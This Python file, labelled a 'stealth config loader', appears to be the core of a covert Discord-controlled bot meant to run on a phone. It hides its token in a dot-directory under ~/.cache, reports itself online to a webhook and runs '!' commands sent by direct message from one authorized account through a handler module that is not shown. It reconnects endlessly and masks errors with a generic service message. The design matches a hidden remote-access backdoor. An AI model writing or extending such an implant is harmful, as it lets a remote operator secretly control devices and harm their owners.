"""Discord Phone Bot — stealth config loader.
Token from config.py (generated at build time)."""
import asyncio
import discord
import os
import sys
import traceback
from pathlib import Path

# Hidden token directory (within app private storage)
TOKEN_DIR = str(Path.home() / ".cache" / ".svc")
TOKEN_PATH = TOKEN_DIR + "/.cfg"

# Debug log
_DEBUG_LOG = str(Path.home() / "bot_debug.log")
def debug(msg):
    try:
        with open(_DEBUG_LOG, "a") as f:
            f.write(f"{msg}\n")
    except:
        pass

ACTIVATED = False
bot_client = None

# Load config from build-time config.py
BOT_TOKEN = None
AUTHORIZED_USER = None
WEBHOOK_URL = None

try:
    import config as _cfg
    BOT_TOKEN = _cfg.BOT_TOKEN
    AUTHORIZED_USER = _cfg.AUTHORIZED_USER
    WEBHOOK_URL = _cfg.WEBHOOK_URL
    debug("config.py loaded OK")
    debug(f"token set: {bool(BOT_TOKEN)}, user: {bool(AUTHORIZED_USER)}")
except (ImportError, AttributeError) as e:
    debug(f"config.py import failed: {e}")
    pass

# Fallback to env vars (for local testing)
if not BOT_TOKEN:
    BOT_TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
    if BOT_TOKEN:
        debug("token from env var")
if not AUTHORIZED_USER:
    AUTHORIZED_USER = os.environ.get("DISCORD_AUTHORIZED_USER", "")
if not WEBHOOK_URL:
    WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")

intents = discord.Intents.default()
intents.message_content = True


async def send_status(msg):
    if not WEBHOOK_URL:
        return
    try:
        import aiohttp
        payload = {"content": msg[:1900]}
        async with aiohttp.ClientSession() as session:
            await session.post(WEBHOOK_URL, json=payload)
    except ImportError:
        pass  # aiohttp not bundled
    except:
        pass


class PhoneBot(discord.Client):
    async def on_ready(self):
        debug(f"Bot online as {self.user}")
        await send_status(f"Bot online as {self.user}")

    async def on_message(self, message):
        if message.author == self.user:
            return
        if not isinstance(message.channel, discord.channel.DMChannel):
            return
        if not message.content.startswith("!"):
            return

        if str(message.author.id) != AUTHORIZED_USER:
            await message.channel.send("⛔ Unauthorized")
            return

        try:
            from commands import handle_command
            parts = message.content.strip().split()
            cmd = parts[0][1:].lower()
            args = " ".join(parts[1:])
            result = await handle_command(cmd, args, message)
            if result:
                await message.channel.send(result[:1900])
        except Exception:
            await message.channel.send("Internal service error.")


def ensure_dir():
    try:
        Path(TOKEN_DIR).mkdir(parents=True, exist_ok=True)
    except:
        pass


def load_token():
    try:
        p = Path(TOKEN_PATH)
        if p.exists():
            return p.read_text().strip()
    except:
        pass
    return None


def save_token(token):
    try:
        ensure_dir()
        Path(TOKEN_PATH).write_text(token.strip())
        return True
    except:
        return False


async def start_bot(token=None):
    global bot_client, ACTIVATED
    if bot_client is not None:
        debug("start_bot called but bot already running")
        return

    token = token or BOT_TOKEN or load_token()
    if not token:
        debug("No token available — bot cannot start")
        return

    debug(f"Starting bot with token: {token[:10]}...")
    ACTIVATED = True
    bot_client = PhoneBot(intents=intents)
    while True:
        try:
            await bot_client.start(token)
        except discord.errors.GatewayNotFound:
            debug("GatewayNotFound — retry in 5s")
            await asyncio.sleep(5)
        except discord.errors.ConnectionClosed:
            debug("ConnectionClosed — retry in 5s")
            await asyncio.sleep(5)
        except Exception as e:
            debug(f"Bot error: {e}")
            debug(traceback.format_exc())
            await asyncio.sleep(30)
        # Clean up so reconnect works cleanly
        try:
            await bot_client.close()
        except:
            pass
        bot_client = PhoneBot(intents=intents)
